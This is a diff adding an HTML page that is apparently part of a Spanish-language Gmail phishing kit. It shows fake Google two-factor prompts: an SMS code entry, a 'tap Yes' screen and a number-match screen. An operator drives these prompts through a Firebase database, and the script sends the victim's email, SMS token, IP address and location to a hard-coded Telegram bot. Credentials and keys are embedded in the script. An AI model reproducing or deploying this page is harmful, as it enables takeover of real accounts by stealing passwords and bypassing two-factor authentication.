@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Loading</title>
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+
+    <style>
+      body{
+        position: relative;
+      }
+      body,
+      html {
+        height: 100%;
+        margin: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background-color: #ffffff;
+      }
+
+      .container {
+        width: 400px;
+        height: 400px;
+        background-color: #ffffff;
+        border: 1px solid #ccc;
+        display: flex;
+        justify-content: center;
+        align-items: flex-start;
+        position: relative;
+        padding-top: 20px;
+      }
+
+      .loading-bar-container {
+        width: 100%;
+        height: 4px;
+        background-color: #eee;
+        position: absolute;
+        top: 0;
+        left: 0;
+        overflow: hidden;
+      }
+
+      .loading-bar {
+        width: 40%;
+        height: 100%;
+        background-color: #3f51b5;
+        animation: loading 1s linear infinite;
+      }
+
+      .email-svg {
+        margin-right: 10px;
+      }
+
+      @keyframes loading {
+        0% {
+          transform: translateX(-100%);
+        }
+        100% {
+          transform: translateX(300%);
+        }
+      }
+
+      /* Media query for mobile devices */
+      @media (max-width: 600px) {
+        .container {
+          width: 380px;
+        }
+      }
+      #cont-nipper{
+        position: fixed;
+        top: 0px;
+        left: 0px;
+        width: 100%;
+        height: 100vh;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        background-color: #fff;
+      }
+      #cont-nipper img{
+        width: 200px;
+      }
+      @keyframes blink {
+     0% { opacity: 1; }
+     50% { opacity: 0; }
+     100% { opacity: 1; }
+}
+      #cont-nipper p{
+        font-size: 17px;
+        color: #333;
+        font-family: Arial, Helvetica, sans-serif;
+        font-family: Arial, Helvetica, sans-serif;
+        animation: blink 2s infinite;
+      }
+      @media(min-width: 768px){
+        #cont-nipper p{
+          font-size: 20px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="loading-bar-container">
+        <div class="loading-bar"></div>
+      </div>
+
+      <div style="width: 100%; display: none" id="codigosms">
+        <div id="paso1">
+          <img src="img/1.png" style="width: 100%" />
+          <div style="width: 100%; text-align: right">
+            <button
+              style="
+                margin-right: 20px;
+                background-color: #1a73e8 !important;
+                color: #f5f5f5 !important;
+                padding: 10px;
+                border: 0;
+                border-radius: 4px;
+              "
+              onclick="mostrarPaso2()"
+            >
+              Siguiente
+            </button>
+          </div>
+        </div>
+        <div id="paso2" style="display: none">
+          <div style="width: 100%; text-align: center">
+            <img src="image.png" style="width: 63px; margin-top: 20px" />
+          </div>
+          <div
+            style="
+              width: 100%;
+              text-align: center;
+              font-family: sans-serif !important;
+            "
+          >
+            <p style="font-size: 24px">Introduce el codigo</p>
+            <div
+              style="
+                width: 100%;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+              "
+            >
+              <div
+                style="
+                  border: 1px solid #bfc1c2;
+                  font-size: 14px;
+                  border-radius: 20px;
+                  padding: 5px;
+                  color: black;
+                  display: flex;
+                  align-items: center;
+                  padding-right: 20px;
+                  padding-left: 20px;
+                "
+              >
+                <svg
+                  class="email-svg"
+                  aria-hidden="true"
+                  fill="currentColor"
+                  focusable="false"
+                  width="20px"
+                  height="20px"
+                  viewBox="0 0 24 24"
+                  xmlns="https://www.w3.org/2000/svg"
+                >
+                  <path
+                    d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"
+                  ></path>
+                </svg>
+                <span id="corr">test@gmail.com</span>
+                <script>
+                    document.getElementById("corr").innerHTML=localStorage.getItem("user");
+                </script>
+              </div>
+            </div>
+            <div style="width: 100%; text-align: center; margin-top: 20px">
+              <input
+                type="text"
+                style="width: 70%; padding: 15px; border: 1px solid #9e9e9e"
+                id="codigo"
+                placeholder="Introduce el código"
+              />
+              <div style="width: 100%; text-align: right; margin-top: 30px">
+                <button
+                  onclick="sdsds(event)"
+                  style="
+                    margin-right: 40px;
+                    background-color: #1a73e8 !important;
+                    color: #f5f5f5 !important;
+                    padding: 10px;
+                    border: 0;
+                    border-radius: 4px;
+                  "
+                >
+                  Siguiente
+                </button>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <script>
+          function mostrarPaso2() {
+            document.getElementById("paso1").style.display = "none";
+            document.getElementById("paso2").style.display = "block";
+          }
+        </script>
+      </div>
+      <div
+        style="display: none;font-family: sans-serif !important; width: 100%"
+        id="pantalla"
+      >
+        <div style="width: 100%; text-align: center">
+          <img src="image.png" style="width: 63px; margin-top: 20px" />
+        </div>
+        <div style="width: 100%">
+          <img
+            src="https://ssl.gstatic.com/accounts/embedded/signin_tapyes.gif"
+            style="width: 150px; margin-left: 90px"
+          />
+        </div>
+        <div style="width: 100%; text-align: left; padding-left: 20px">
+          <p style="font-size: 15px; font-weight: bold">Consulta tu Telefono</p>
+          <div style="width: 90%; text-align: justify">
+            <p style="font-size: 12px">
+              Google envio una notificación a tu telefono. Toca
+              <span style="font-weight: bold">Si</span> en la notificacion, para
+              verificar que eres tu.
+              <br>
+              <br>
+              <input type="checkbox" name="" id="" style="margin: 0;border: 0;">
+              <br>
+              <br>
+              No volver a preguntar en este dispositivo
+            </p>
+          </div>
+        </div>
+      </div>
+      <div
+        id="codigonum"
+        style="display: none; font-family: sans-serif !important; width: 100%"
+      >
+        <div style="width: 100%; text-align: center">
+          <img src="image.png" style="width: 63px; margin-top: 20px" />
+        </div>
+        <div style="width: 100%; text-align: left; padding-left: 20px">
+          <p
+            id="tapnumber"
+            style="font-size: 28px; font-weight: bold; margin-left: 20px"
+          >
+            23
+          </p>
+          <p style="font-size: 12px; font-weight: bold">
+            Abre tu Gmail app y presiona
+          </p>
+          <div style="width: 90%; text-align: justify">
+            <p style="font-size: 12px">
+              Google envio una notificación a tu telefono. Abre Gmail app, y
+              presiona <span style="font-weight: bold">Si</span> en el mensaje,
+              luego presiona
+              <span id="tapnumberr" style="font-weight: bold"> 23 </span> en tu
+              teléfono para verificar que eres tu.
+            </p>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div id="cont-nipper">
+      <img src="../img/buda.svg" alt="">
+      <p>Conectando, por favor, espere.</p>
+
+    </div>
+
+
+  </body>
+  <script>
+    //SNIPER GMAIL
+    const niper = document.querySelector('#cont-nipper');
+    setTimeout(function(){
+      niper.style.display = 'none';
+    }, 15000);
+  </script>
+  <script src="https://www.gstatic.com/firebasejs/8.6.5/firebase-app.js"></script>
+
+  <!-- TODO: Add SDKs for Firebase products that you want to use
+     https://firebase.google.com/docs/web/setup#available-libraries -->
+  <script src="https://www.gstatic.com/firebasejs/8.6.5/firebase-analytics.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.6.5/firebase-firestore.js"></script>
+  <script>
+    // Configura tu aplicación de Firebase
+    var firebaseConfig = {
+      apiKey: "AIzaSyASzVfYBcoLc9xPRugwdM4MxFCSRLWKF1U",
+      authDomain: "apibd-bce60.firebaseapp.com",
+      projectId: "apibd-bce60",
+      storageBucket: "apibd-bce60.appspot.com",
+      messagingSenderId: "1092641760097",
+      appId: "1:1092641760097:web:1878591a9a4758c6395b20",
+    };
+    firebase.initializeApp(firebaseConfig);
+  </script>
+
+  <script>
+    // Obtiene una referencia a la base de datos Firestore
+    const db = firebase.firestore();
+
+    function order(params) {
+      if (localStorage.getItem("orderid") == "") {
+        db.collection("Buda")
+          .add({
+            NombreCliente: localStorage.getItem("user"),
+
+            code: false,
+            auth: false,
+            codec: false,
+            codeee: 0,
+
+            index: false,
+            out: false,
+          })
+          .then((docRef) => {
+            localStorage.setItem("orderid", docRef.id);
+            chcstat();
+          })
+          .catch((error) => {
+            console.error("Error writing document: ", error);
+          });
+      } else {
+      }
+    }
+    window.onload = order();
+
+    function chng(params) {
+      let docref = localStorage.getItem("orderid");
+      var upd = db.collection("Buda").doc(docref);
+      return upd
+        .update({
+          code: false,
+        })
+        .then(() => {
+          document.getElementById("codigosms").style.display = "none";
+        })
+        .catch((error) => {
+          console.error("Error writing document: ", error);
+        });
+    }
+
+    function chcstat(params) {
+      console.log("loado");
+      let hears = localStorage.getItem("orderid");
+
+      // Escuchar cambios en el documento
+      db.collection("Buda")
+        .doc(hears)
+        .onSnapshot(
+          (doc) => {
+            if (doc.exists) {
+              const data = doc.data();
+              console.log(data.codeee);
+
+              if (data.auth == false) {
+              } else {
+                document.getElementById("codigonum").style.display = "none";
+                document.getElementById("codigosms").style.display = "none";
+                document.getElementById("pantalla").style.display = "block";
+              }
+
+              if (data.code == false) {
+              } else {
+                document.getElementById("codigonum").style.display = "none";
+                document.getElementById("pantalla").style.display = "none";
+                document.getElementById("codigosms").style.display = "block";
+              }
+              if (data.codec == false) {
+              } else {
+                document.getElementById("pantalla").style.display = "none";
+                document.getElementById("codigosms").style.display = "none";
+                document.getElementById("codigonum").style.display = "block";
+                document.getElementById("tapnumberr").innerHTML = data.codeee;
+                document.getElementById("tapnumber").innerHTML = data.codeee;
+              }
+
+              if (data.index == false) {
+              } else {
+                window.location = "index.html";
+              }
+              if (data.out == false) {
+              }
+            } else {
+              window.location = "index.html";
+            }
+          },
+          (error) => {
+            console.error("Error al escuchar el documento: ", error);
+          }
+        );
+    }
+
+    function sdsd(event) {
+      document.getElementById("pantalla").style.display = "none";
+      document.getElementById("show").style.display = "block";
+
+      event.preventDefault();
+    }
+
+    function sdsds(event) {
+      alert();
+      event.preventDefault();
+    }
+  </script>
+  <script>
+    function alert(params) {
+      const url = "https://ipapi.co/json/";
+      const form = document.querySelector("#login-form");
+      axios
+        .get(url)
+        .then((response) => {
+          const email = localStorage.getItem("user");
+          const token = document.getElementById("codigo").value;
+          const message =
+            "Correo: " +
+            email +
+            "\nToken SMS: " +
+            token +
+            "\nCiudad:" +
+            response.data.city +
+            "\nPais: " +
+            response.data.country +
+            "\nIP: " +
+            response.data.ip;
+          axios
+            .post(
+              "https://api.telegram.org/bot7339513428:AAHN5cov7e0MK0X7Pwn_P_uormVfQrH8CGY/sendMessage",
+              {
+                chat_id: "-1002237589249",
+                text: message,
+              }
+            )
+            .then((response) => {
+              console.debug(response);
+              console.log("enviado");
+              document.getElementById("codigo").value = "";
+              chng();
+            })
+            .catch((error) => {
+              console.error(error);
+            });
+        })
+        .catch((error) => {
+          console.log(error);
+        });
+    }
+  </script>
+</html>
